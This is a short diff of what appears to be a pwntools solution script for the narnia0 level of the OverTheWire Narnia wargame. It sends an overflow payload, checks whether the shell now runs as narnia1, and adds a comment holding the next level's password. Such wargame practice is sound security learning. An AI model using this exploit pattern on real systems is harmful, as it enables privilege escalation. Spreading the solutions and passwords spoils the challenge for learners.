@@ -16,6 +16,7 @@ log.info('trying exploit ...')
 sh.sendline('./narnia0')
 sh.sendline(fill + exp)
 r = sh.recvuntil('$ ')
+log.info(r)
 log.info('checking if it works ... ')
 sh.sendline('whoami')
 if sh.recvuntil('$ ').decode()[:7] == 'narnia1':
@@ -27,5 +28,4 @@ if sh.recvuntil('$ ').decode()[:7] == 'narnia1':
 else:
     log.critical('exploit failed!!')
 
-
-
+#pass efeidiedae
